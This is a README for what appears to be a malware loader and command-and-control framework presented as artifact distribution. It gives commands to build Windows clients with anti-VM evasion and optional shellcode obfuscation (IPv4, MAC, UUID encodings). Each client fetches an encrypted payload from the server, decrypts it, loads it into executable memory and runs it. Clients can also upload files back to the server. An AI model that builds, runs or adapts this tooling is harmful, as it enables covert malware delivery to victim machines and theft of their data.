# Running

## Server (Linux)

Binary: `target/release/server`.

### Global options

| Flag | Default | Description |
|---|---|---|
| `--db <file>` | `data/orchestrator.db` | SQLite database path |
| `--data-dir <dir>` | `data` | directory for artifacts, staging and clients |

### Master passphrase

Read from the `SERVER_MASTER_PASSPHRASE` environment variable; if absent, the server
prompts interactively (hidden input). The same passphrase must be used on every run — it
is what opens the encrypted database.

### Operator password and administrative commands

In addition to the master passphrase, the CLI uses a separate operator password to authorize
local administrative operations. The operator password is stored only as an Argon2id hash in
SQLite and does not replace the master passphrase.

Configure it once:

```bash
SERVER_MASTER_PASSPHRASE=your-secret ./target/release/server \
  --db data/orchestrator.db --data-dir data operator init
```

The following commands then prompt for the operator password:

```bash
# Build history, without private keys or passphrases
SERVER_MASTER_PASSPHRASE=your-secret ./target/release/server builds --limit 50

# Recent lines from the persisted process log
SERVER_MASTER_PASSPHRASE=your-secret ./target/release/server logs --lines 100

# Diagnostics remain PGP blobs and are not decrypted by the server
SERVER_MASTER_PASSPHRASE=your-secret ./target/release/server diagnostics
SERVER_MASTER_PASSPHRASE=your-secret ./target/release/server diagnostics --build-id build-<hex>
```

Logs are stored in `data/logs/server.log`. Administrative access is local to the CLI; there
is no administrative login over the HTTP API. Never put either password in command arguments
or log files.

### Named users and the interactive console

On a new database, create the first named user directly:

```bash
SERVER_MASTER_PASSPHRASE=your-secret ./target/release/server user create n0kk
```

The command asks for the new password twice without echoing it. Administrative commands then
ask for `Username` and `Password`.

On an existing database that already has the legacy `operator_auth` entry, reset or configure
the legacy password first:

```bash
SERVER_MASTER_PASSPHRASE=your-secret ./target/release/server operator init
```

Then create `n0kk` using the existing administrator and choose the new password:

```text
Username: operator
Password: <operator password>
New operator password: <n0kk password>
Repeat operator password: <n0kk password>
```

Run the interactive console as `n0kk` with:

```bash
SERVER_MASTER_PASSPHRASE=your-secret ./target/release/server console
```

Enter `n0kk` at `Username` and its password:

```text
Username: n0kk
Password:
server>
```

Inside the console, use `help` to list commands. For example:

```text
builds
logs 100
diagnostics
listen
client create --artifact ./payload.bin --uid release-1 --no-antivm
exit
```

The `listen` command starts the HTTPS API from inside the console, using
`https://127.0.0.1:8443` by default. It accepts an optional address and SAN list:

```text
listen 0.0.0.0:8443 your-host 127.0.0.1
```

While the listener is active, the console remains blocked serving requests.
Stop the server process and reopen the console to return to the prompt.

This is an application user and does not change the Linux account. The
`SERVER_MASTER_PASSPHRASE` is still required to open the database on every run.

### `new-build` subcommand

Generates the PGP key, encrypts the artifact, issues the client certificate, writes
everything (sealed) to the database, and **compiles the client binary**.

```bash
SERVER_MASTER_PASSPHRASE=your-secret ./target/release/server \
  --db data/orchestrator.db --data-dir data \
  new-build \
    --artifact ./payload.bin \
    --uid release-1 \
    --server-url https://your-host:8443 \
    --target x86_64-pc-windows-gnu
```

| Flag | Default | Description |
|---|---|---|
| `--artifact <file>` | (required) | plaintext file to distribute |
| `--uid <id>` | (required) | logical release identifier (goes in the PGP key UID) |
| `--server-url <url>` | `https://127.0.0.1:8443` | URL embedded in the client |
| `--target <triple>` | (none = native) | client target, e.g. `x86_64-pc-windows-gnu` |
| `--no-antivm` | (off) | compile the client without the anti-VM protection (`--no-default-features`); useful for development testing. See [antivm.md](antivm.md) |
| `--debug` | (off) | compile a native debug client instead of a release client |
| `--obfs` | (off) | enable the client's `obf` shellcode representation subcommand |

Output (printed at the end):

```
build id:       build-<hex>
client binary:  data/clients/build-<hex>/client.exe
encrypted file: data/artifacts/build-<hex>.pgp
```

Generated files:
- `data/artifacts/<id>.pgp` — encrypted artifact.
- `data/staging/<id>/ca.pem`, `identity.pem` — assets used to compile the client (also
  useful for testing with `curl`).
- `data/clients/<id>/client.exe` — the functional client for that build.

### `serve` subcommand

Starts the mTLS API.

```bash
SERVER_MASTER_PASSPHRASE=your-secret ./target/release/server \
  --db data/orchestrator.db --data-dir data \
  serve --addr 0.0.0.0:8443 --san your-host --san 127.0.0.1
```

| Flag | Default | Description |
|---|---|---|
| `--addr <ip:port>` | `127.0.0.1:8443` | listen address |
| `--san <name>` (repeatable) | `localhost`, `127.0.0.1` | server certificate SANs |

> The `--san` values must match the host the client uses in the URL (`--server-url`),
> otherwise the client's TLS verification of the server certificate fails.

## Client (Windows)

Binary: the `client.exe` produced by `new-build` (in `data/clients/<id>/`), copied to the
Windows machine.

```bat
client.exe --out C:\out\file.bin
```

| Flag | Default | Description |
|---|---|---|
| `--out <file>` | system temporary directory | where to write the decrypted file before executing it; when omitted, uses `rustbuilder-<build-id>.bin` in the Windows `%TEMP%` directory |
| `--upload <file>` | (optional) | upload this file as an encrypted diagnostic (upload mode) |
| `--server <url>` | value embedded in the build | override the server URL |
| `--build-id <id>` | value embedded in the build | override the build id |

The client connects over mTLS (with the embedded identity), downloads the encrypted
artifact and the private key, **decrypts locally**, writes to `--out`, and executes the
resulting artifact. On Windows, execution loads the bytes in 256-byte chunks into executable
memory. When `--out` is omitted, it writes automatically to the system temporary directory.

With `--debug`, the generated client writes a diagnostic log to
`Desktop/RustBuilder-debug/client.log`. With `--obfs`, the client also accepts
`obf --file <path> --technique <ipv4|ipv6|mac|uuid> --operation <obfuscate|deobfuscate>`;
obfuscation writes a fixed output filename in the current directory.

### Diagnostic upload

With `--upload <file>`, the client encrypts the file with the build's PGP public key (embedded
in the binary) and uploads it to the server in chunks (`POST /builds/:id/diagnostics`); the
server writes the encrypted blob to `data/diagnostics/<id>/`. Plaintext never leaves the client
machine. This mode is a thin wrapper over the reusable `upload_diagnostic` function. It exits
after the upload and does not run the download or execution path.

```bat
client.exe --upload C:\diag\collect.txt
```

## End-to-end flow (local test example)

```bash
export PATH="$HOME/.cargo/bin:$PATH"
export SERVER_MASTER_PASSPHRASE=your-secret
echo "secret content" > payload.txt

# 1) create a build (native client to test on Linux itself; swap --target for Windows)
./target/release/server --data-dir data new-build \
  --artifact payload.txt --uid demo

# 2) start the server (in another terminal, or in the background)
./target/release/server --data-dir data serve &

# 3) run the generated client
BID=$(ls data/clients | head -1)
./data/clients/$BID/client --out output.txt

# 4) verify
diff payload.txt output.txt && echo "OK"
```

Validated result during development: identical content after the roundtrip (including
accented characters), and `403` when trying to fetch another build's key.
